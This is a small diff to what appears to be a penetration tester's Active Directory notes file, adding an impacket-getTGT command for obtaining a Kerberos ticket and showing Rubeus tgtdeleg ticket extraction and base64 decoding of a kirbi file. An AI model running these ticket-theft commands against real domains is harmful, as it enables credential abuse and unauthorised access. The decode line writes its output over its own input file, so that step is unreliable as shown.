@@ -122,6 +122,8 @@
     ```
 
 # Generate TGT
+- get the ccache ticket for kerberos authN ``` impacket-getTGT {ocsp.exam}/{hoidam} ```
+
 ## Rubeus tgtdeleg
 - ``` .\rubeus.exe tgtdeleg /nowrap ```
 - decode the kirbi with base 64 ``` cat {ticket.kirbi} | base64 -d > {ticket.kirbi} ```
